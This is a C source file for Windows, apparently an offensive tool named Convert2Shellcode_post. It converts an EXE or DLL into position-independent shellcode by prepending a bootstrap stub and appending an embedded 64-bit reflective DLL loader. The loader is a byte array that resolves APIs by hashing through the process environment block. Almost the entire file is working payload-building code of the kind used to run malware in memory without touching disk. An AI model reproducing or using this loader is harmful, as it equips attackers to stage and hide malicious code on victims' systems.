#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

// 反射式加载器的shellcode
unsigned char rdiShellcode64[] = {
    0xFC, 0x53, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41,
    0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8B, 0xEC,
    0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0x4D, 0x08,
    0x48, 0x8B, 0x45, 0x08, 0x44, 0x8B, 0x60, 0x3C,
    0x4C, 0x03, 0xE0, 0x41, 0x8B, 0x54, 0x24, 0x50,
    0x48, 0x33, 0xC9, 0x41, 0xB8, 0x00, 0x10, 0x00,
    0x00, 0x41, 0xB9, 0x40, 0x00, 0x00, 0x00, 0x49,
    0xBA, 0xAF, 0x86, 0xFA, 0xFB, 0x00, 0x00, 0x00,
    0x00, 0xE8, 0x47, 0x02, 0x00, 0x00, 0x48, 0x83,
    0xC4, 0x20, 0x48, 0x89, 0x45, 0x10, 0x41, 0x8B,
    0x4C, 0x24, 0x54, 0x48, 0x8B, 0x75, 0x08, 0x48,
    0x8B, 0xF8, 0xF3, 0xA4, 0x44, 0x8B, 0x60, 0x3C,
    0x4C, 0x03, 0xE0, 0x4C, 0x89, 0x65, 0x18, 0x41,
    0x0F, 0xB7, 0x44, 0x24, 0x14, 0x4D, 0x8D, 0x74,
    0x04, 0x18, 0x45, 0x0F, 0xB7, 0x6C, 0x24, 0x06,
    0x41, 0x83, 0x7E, 0x10, 0x00, 0x74, 0x16, 0x41,
    0x8B, 0x76, 0x14, 0x48, 0x03, 0x75, 0x08, 0x41,
    0x8B, 0x7E, 0x0C, 0x48, 0x03, 0x7D, 0x10, 0x41,
    0x8B, 0x4E, 0x10, 0xF3, 0xA4, 0x49, 0x83, 0xC6,
    0x28, 0x41, 0xFF, 0xCD, 0x75, 0xDA, 0x48, 0x8B,
    0x45, 0x18, 0x48, 0x8B, 0x5D, 0x10, 0x48, 0x2B,
    0x58, 0x30, 0x53, 0x48, 0x8D, 0x90, 0xB0, 0x00,
    0x00, 0x00, 0x8B, 0x12, 0x48, 0x03, 0x55, 0x10,
    0x8B, 0x02, 0x85, 0xC0, 0x74, 0x40, 0x8B, 0x4A,
    0x04, 0x48, 0x8D, 0x72, 0x08, 0x48, 0x03, 0xCA,
    0x0F, 0xB7, 0x06, 0x8B, 0xD8, 0xC1, 0xEB, 0x0C,
    0x66, 0x83, 0xFB, 0x0A, 0x75, 0x15, 0x25, 0xFF,
    0x0F, 0x00, 0x00, 0x03, 0x02, 0x48, 0x03, 0x45,
    0x10, 0x48, 0x8B, 0x18, 0x48, 0x03, 0x1C, 0x24,
    0x48, 0x89, 0x18, 0x48, 0x3B, 0xCE, 0x74, 0x06,
    0x48, 0x83, 0xC6, 0x02, 0xEB, 0xD2, 0x8B, 0x42,
    0x04, 0x48, 0x03, 0xD0, 0xEB, 0xBA, 0x5B, 0x48,
    0x8B, 0x45, 0x18, 0x8B, 0x80, 0x90, 0x00, 0x00,
    0x00, 0x4C, 0x8B, 0x65, 0x10, 0x4C, 0x03, 0xE0,
    0x41, 0x83, 0x3C, 0x24, 0x00, 0x0F, 0x84, 0x8B,
    0x00, 0x00, 0x00, 0x41, 0x8B, 0x4C, 0x24, 0x0C,
    0x48, 0x03, 0x4D, 0x10, 0x49, 0xC7, 0xC2, 0xE9,
    0x0A, 0x59, 0x56, 0xE8, 0x5D, 0x01, 0x00, 0x00,
    0x48, 0x83, 0xC4, 0x20, 0x48, 0x93, 0x41, 0x8B,
    0x34, 0x24, 0x48, 0x03, 0x75, 0x10, 0x41, 0x8B,
    0x7C, 0x24, 0x10, 0x48, 0x03, 0x7D, 0x10, 0x83,
    0x3E, 0x00, 0x74, 0x51, 0x48, 0x8B, 0x06, 0x48,
    0x8B, 0xD0, 0x48, 0x85, 0xC0, 0x78, 0x1C, 0x48,
    0x8B, 0xCB, 0x48, 0x03, 0x55, 0x10, 0x48, 0x83,
    0xC2, 0x02, 0x49, 0xBA, 0x05, 0xB9, 0x58, 0xE6,
    0x00, 0x00, 0x00, 0x00, 0xE8, 0x1C, 0x01, 0x00,
    0x00, 0xEB, 0x19, 0x48, 0x81, 0xE2, 0xFF, 0xFF,
    0x00, 0x00, 0x48, 0x8B, 0xCB, 0x49, 0xBA, 0x05,
    0xB9, 0x58, 0xE6, 0x00, 0x00, 0x00, 0x00, 0xE8,
    0x01, 0x01, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x20,
    0x48, 0x89, 0x07, 0x48, 0x83, 0xC6, 0x08, 0x48,
    0x83, 0xC7, 0x08, 0xEB, 0xAA, 0x49, 0x83, 0xC4,
    0x14, 0xE9, 0x6A, 0xFF, 0xFF, 0xFF, 0x48, 0x8B,
    0x5D, 0x18, 0x0F, 0xB7, 0x43, 0x14, 0x4C, 0x8D,
    0x64, 0x03, 0x18, 0x44, 0x0F, 0xB7, 0x6B, 0x06,
    0x41, 0x8B, 0x44, 0x24, 0x24, 0x25, 0x00, 0x00,
    0x00, 0xE0, 0xC1, 0xE8, 0x1D, 0xE8, 0x08, 0x00,
    0x00, 0x00, 0x01, 0x10, 0x02, 0x20, 0x08, 0x80,
    0x04, 0x40, 0x5E, 0x44, 0x0F, 0xB6, 0x04, 0x06,
    0x41, 0x8B, 0x4C, 0x24, 0x0C, 0x48, 0x03, 0x4D,
    0x10, 0x41, 0x8B, 0x54, 0x24, 0x10, 0x48, 0x83,
    0xEC, 0x08, 0x4C, 0x8B, 0xCC, 0x49, 0xBA, 0x76,
    0x82, 0x91, 0xE3, 0x00, 0x00, 0x00, 0x00, 0xE8,
    0x91, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28,
    0x49, 0x83, 0xC4, 0x28, 0x41, 0xFF, 0xCD, 0x45,
    0x85, 0xED, 0x75, 0xAC, 0x48, 0x8B, 0x45, 0x18,
    0x48, 0x8D, 0x80, 0xD0, 0x00, 0x00, 0x00, 0x83,
    0x78, 0x04, 0x00, 0x74, 0x27, 0x8B, 0x10, 0x48,
    0x03, 0x55, 0x10, 0x48, 0x8B, 0x7A, 0x18, 0x48,
    0x83, 0x3F, 0x00, 0x74, 0x17, 0x48, 0x8B, 0x07,
    0x48, 0x8B, 0x4D, 0x10, 0xBA, 0x01, 0x00, 0x00,
    0x00, 0x45, 0x33, 0xC0, 0xFF, 0xD0, 0x48, 0x83,
    0xC7, 0x08, 0xEB, 0xE3, 0x48, 0x8B, 0x75, 0x18,
    0x66, 0x8B, 0x46, 0x16, 0x66, 0xA9, 0x00, 0x20,
    0x74, 0x21, 0x48, 0x83, 0xEC, 0x20, 0x8B, 0x5E,
    0x28, 0x48, 0x03, 0x5D, 0x10, 0x48, 0x8B, 0x4D,
    0x10, 0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00,
    0x45, 0x33, 0xC0, 0xFF, 0xD3, 0x48, 0x83, 0xC4,
    0x20, 0xEB, 0x09, 0x8B, 0x5E, 0x28, 0x48, 0x03,
    0x5D, 0x10, 0xFF, 0xD3, 0x48, 0x83, 0xC4, 0x20,
    0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C,
    0x5F, 0x5E, 0x5D, 0x5B, 0xC3, 0x41, 0x51, 0x41,
    0x50, 0x52, 0x51, 0x56, 0x41, 0x54, 0x48, 0x33,
    0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B,
    0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B,
    0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x48, 0x4D,
    0x33, 0xC0, 0x48, 0x33, 0xC0, 0xAC, 0x3C, 0x61,
    0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC8, 0x0D,
    0x44, 0x03, 0xC0, 0xFF, 0xC9, 0x75, 0xEB, 0x52,
    0x41, 0x50, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42,
    0x3C, 0x48, 0x03, 0xC2, 0x66, 0x81, 0x78, 0x18,
    0x0B, 0x02, 0x75, 0x79, 0x8B, 0x80, 0x88, 0x00,
    0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x6E, 0x48,
    0x03, 0xC2, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B,
    0x48, 0x20, 0x4C, 0x03, 0xCA, 0x48, 0x85, 0xC9,
    0x74, 0x5A, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34,
    0x89, 0x48, 0x03, 0xF2, 0x4D, 0x33, 0xC0, 0x48,
    0x33, 0xC0, 0xAC, 0x84, 0xC0, 0x74, 0x09, 0x41,
    0xC1, 0xC8, 0x0D, 0x44, 0x03, 0xC0, 0xEB, 0xEF,
    0x4C, 0x03, 0x44, 0x24, 0x08, 0x45, 0x3B, 0xC2,
    0x75, 0xD3, 0x58, 0x44, 0x8B, 0x48, 0x24, 0x4C,
    0x03, 0xCA, 0x66, 0x41, 0x8B, 0x0C, 0x49, 0x44,
    0x8B, 0x48, 0x1C, 0x4C, 0x03, 0xCA, 0x41, 0x8B,
    0x04, 0x89, 0x48, 0x03, 0xC2, 0x41, 0x58, 0x41,
    0x58, 0x41, 0x5C, 0x5E, 0x59, 0x5A, 0x41, 0x58,
    0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20,
    0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x58, 0x5A,
    0x48, 0x8B, 0x12, 0xE9, 0x46, 0xFF, 0xFF, 0xFF
};

// 辅助函数：将32位整数打包为小端字节序
void pack(uint32_t val, uint8_t* bytes) {
    bytes[0] = val & 0xFF;
    bytes[1] = (val >> 8) & 0xFF;
    bytes[2] = (val >> 16) & 0xFF;
    bytes[3] = (val >> 24) & 0xFF;
}

int wmain(int argc, wchar_t* argv[]) {

    printf("╔══════════════════════════════════════════════════════════════════════════════════════╗\n");
    printf("║                           Convert2Shellcode_post                                     ║\n");
    printf("║------------------------------------------------------------------------------------- ║\n");
    printf("║ Function: Use post-style RDI to convert EXE/DLL into position-independent shellcode  ║\n");
    printf("║ Author：oneday                                                                       ║\n");
    printf("║ Compilation Date：%hs %hs                                               ║\n", __DATE__, __TIME__);
    printf("╚══════════════════════════════════════════════════════════════════════════════════════╝\n");
    printf("\n");

    // 检查参数数量
    if (argc < 2) {
        printf("[-] Error: Missing DLL/EXE path parameter\n");
        printf("[*] Usage: Convert2Shellcode_post.exe <DLL/EXE Path> [Output File Path]\n");
        printf("[*] Example 1: Convert2Shellcode_post.exe C:\\path\\to\\Test.dll\n");
        printf("[*] Example 2: Convert2Shellcode_post.exe C:\\path\\to\\ReflectiveDLL.dll C:\\path\\to\\Shellcode.bin\n");
        return 1;
    }

    uint8_t* finalcode = NULL;
    uint8_t bootstrap[24];
    size_t finalSize = 0;
    uint8_t* dllBytes = NULL;
    size_t dllSize = 0;

    // 构建引导代码
    int index = 0;

    // pop rax
    bootstrap[index++] = 0x58;

    // push rax
    bootstrap[index++] = 0x50;

    // call next instruction
    bootstrap[index++] = 0xE8;
    bootstrap[index++] = 0x00;
    bootstrap[index++] = 0x00;
    bootstrap[index++] = 0x00;
    bootstrap[index++] = 0x00;

    // pop rcx
    bootstrap[index++] = 0x59;

    // sub rcx,7
    bootstrap[index++] = 0x48;
    bootstrap[index++] = 0x83;
    bootstrap[index++] = 0xE9;
    bootstrap[index++] = 0x07;

    // mov rax,rcx
    bootstrap[index++] = 0x48;
    bootstrap[index++] = 0x8B;
    bootstrap[index++] = 0xC1;

    const wchar_t* dllPath = argv[1];
    FILE* dllFile = _wfopen(dllPath, L"rb");
    if (!dllFile) {
        printf("[-] Error: Unable to open file %s (Error code: %d)\n", dllPath, GetLastError());
        return 1;
    }
    printf("[+] Successfully opened %s\n", dllPath);

    // 获取文件大小
    fseek(dllFile, 0, SEEK_END);
    dllSize = ftell(dllFile);
    fseek(dllFile, 0, SEEK_SET);
    if (dllSize == 0) {
        printf("[-] Error: File size is 0 - %s\n", dllPath);
        fclose(dllFile);
        return 1;
    }
    printf("[*] File size is %zu\n", dllSize);

    // 读取文件内容
    dllBytes = (uint8_t*)malloc(dllSize);
    if (!dllBytes) {
        printf("[-] Error: Memory allocation failed (requested dllSize: %zu bytes)\n", dllSize);
        fclose(dllFile);
        return 1;
    }
    printf("[+] Memory allocation successful, address is 0x%x\n", dllBytes);

    size_t bytesRead = fread(dllBytes, 1, dllSize, dllFile);
    fclose(dllFile);
    if (bytesRead != dllSize) {
        printf("[-] Error: File read incomplete (read %zu/%zu bytes)\n", bytesRead, dllSize);
        free(dllBytes);
        return 1;
    }
    printf("[*] %zu bytes read into memory\n", bytesRead);

    // 计算DLL偏移量
    size_t rdiShellcodeSize = sizeof(rdiShellcode64);
    uint32_t srdiOffset = dllSize;

    // add rax, <Offset of the DLL>
    bootstrap[index++] = 0x48;
    bootstrap[index++] = 0x05;
    pack(srdiOffset, bootstrap + index);
    index += 4;

    // call rax
    bootstrap[index++] = 0xFF;
    bootstrap[index++] = 0xD0;

    // ret
    bootstrap[index++] = 0xC3;

    finalSize = dllSize + sizeof(rdiShellcode64);
    finalcode = (uint8_t*)malloc(finalSize);
    if (!finalcode) {
        printf("[-] Error: Memory allocation failed (requested finalSize: %zu bytes)\n", finalSize);
        free(dllBytes);
        return 1;
    }
    printf("[+] Memory allocation successful, address is 0x%x\n", finalcode);

    // 构造最终的shellcode
    memcpy(finalcode, dllBytes, dllSize);
    memcpy(finalcode, bootstrap, index);
    memcpy(finalcode + dllSize, rdiShellcode64, sizeof(rdiShellcode64));

    // 释放 DLL 缓冲区
    free(dllBytes);
    dllBytes = NULL;

    // 处理输出文件参数
    const wchar_t* outputPath = (argc >= 3) ? argv[2] : L"shellcode_post.bin";

    // 写入文件
    HANDLE hFile = CreateFileW(
        outputPath,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Error: Unable to create output file %s (Error code: %d)\n", outputPath, GetLastError());
        free(finalcode);
        return 1;
    }

    DWORD bytesWritten;
    BOOL writeResult = WriteFile(
        hFile,
        finalcode,
        (DWORD)finalSize,
        &bytesWritten,
        NULL
    );

    if (!writeResult || bytesWritten != finalSize) {
        printf("[-] Error: Failed to write to file (wrote %lu/%zu bytes, error code: %d)\n",
            bytesWritten, finalSize, GetLastError());
        CloseHandle(hFile);
        free(finalcode);
        return 1;
    }

    FlushFileBuffers(hFile);
    CloseHandle(hFile);
    printf("[+] Successfully generated shellcode file: %s (Size: %zu bytes)\n", outputPath, finalSize);

    return 0;
}